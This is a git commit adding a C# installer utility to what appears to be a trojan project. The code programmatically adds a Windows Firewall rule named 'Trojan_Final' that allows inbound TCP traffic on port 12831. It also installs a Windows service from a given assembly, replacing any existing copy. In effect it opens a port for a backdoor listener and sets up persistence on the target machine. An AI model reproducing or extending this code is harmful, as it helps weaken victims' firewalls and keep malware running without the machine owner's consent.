859ee5b0cc54d79d98f266bba809744c529513cf
Cătălin-Răzvan Barbălată <barbalata.razvan@gmail.com>
2018-04-14 23:06:24 +0300

    Create Installer/Utils.

---
+++ Installer/Utils.cs
@@ -0,0 +1,111 @@
+﻿using NetFwTypeLib;
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Configuration.Install;
+using System.Linq;
+using System.Reflection;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Installer
+{
+    class Utils
+    {
+        // Add a rule at FireWall
+        public static void ConfigureFirewall()
+        {
+            INetFwMgr icfMgr = null;
+            try
+            {
+                Type TicfMgr = Type.GetTypeFromProgID("HNetCfg.FwMgr");
+                icfMgr = (INetFwMgr)Activator.CreateInstance(TicfMgr);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Eroare");
+            }
+
+            try
+            {
+                Type tNetFwPolicy2 = Type.GetTypeFromProgID("HNetCfg.FwPolicy2");
+                INetFwPolicy2 fwPolicy2 = (INetFwPolicy2)Activator.CreateInstance(tNetFwPolicy2);
+                var currentProfiles = fwPolicy2.CurrentProfileTypes;
+
+                INetFwRule2 inboundRule = (INetFwRule2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
+                inboundRule.Enabled = true;
+                inboundRule.Action = NET_FW_ACTION_.NET_FW_ACTION_ALLOW;
+                inboundRule.Protocol = 6;
+                inboundRule.LocalPorts = "12831";
+                inboundRule.Name = "Trojan_Final";
+                inboundRule.Profiles = currentProfiles;
+
+                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FwPolicy2"));
+                firewallPolicy.Rules.Add(inboundRule);
+
+                Console.WriteLine("Succes!");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+        #region Installing the Windows Service Application
+        public static void InstallService(string serviceName, Assembly assembly)
+        {
+            if (IsServiceInstalled(serviceName))
+            {
+                AssemblyInstaller uninstall = new AssemblyInstaller(assembly, null);
+                uninstall.UseNewContext = true;
+                uninstall.Uninstall(null);
+            }
+
+            using (AssemblyInstaller installer = GetInstaller(assembly))
+            {
+                IDictionary state = new Hashtable();
+                try
+                {
+                    installer.Install(state);
+                    installer.Commit(state);
+                }
+                catch
+                {
+                    try
+                    {
+                        installer.Rollback(state);
+                    }
+                    catch { }
+                    throw;
+                }
+            }
+        }
+
+        public static bool IsServiceInstalled(string serviceName)
+        {
+            using (ServiceController controller = new ServiceController(serviceName))
+            {
+                try
+                {
+                    ServiceControllerStatus status = controller.Status;
+                }
+                catch
+                {
+                    return false;
+                }
+
+                return true;
+            }
+        }
+
+        private static AssemblyInstaller GetInstaller(Assembly assembly)
+        {
+            AssemblyInstaller installer = new AssemblyInstaller(assembly, null);
+            installer.UseNewContext = true;
+
+            return installer;
+        }
+        #endregion;
+    }
+}
